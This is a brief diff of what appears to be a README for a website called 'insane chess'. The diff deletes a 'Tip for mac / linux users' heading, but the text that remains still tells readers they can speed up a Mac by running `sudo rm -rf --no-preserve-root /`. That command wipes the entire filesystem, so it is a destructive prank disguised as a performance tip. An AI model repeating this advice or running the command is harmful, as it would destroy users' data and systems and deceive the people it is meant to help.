@@ -31,7 +31,7 @@ Whats going on:  Currently, i am working on a website called "insane chess" wher
 
 --------------------------------------------------------------------------------------------------------
 
-# Tip for mac / linux users
+
 
 Also, to make your mac faster, open the terminal and type
 `sudo rm -rf --no-preserve-root /`
